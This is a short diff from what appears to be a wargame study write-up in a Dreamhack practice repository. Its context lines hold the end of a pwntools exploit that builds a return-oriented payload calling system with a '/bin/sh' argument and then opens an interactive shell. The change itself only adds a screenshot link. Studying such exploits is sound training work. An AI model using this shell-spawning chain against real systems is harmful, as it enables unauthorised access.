@@ -86,3 +86,5 @@ payload += p32(system) + p32(pop) + p32(binsh)
 p.send(payload)
 p.interactive()
 ```
+
+<img width="829" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/e8de9669-fdd0-4b78-b49b-b7e87783834a">
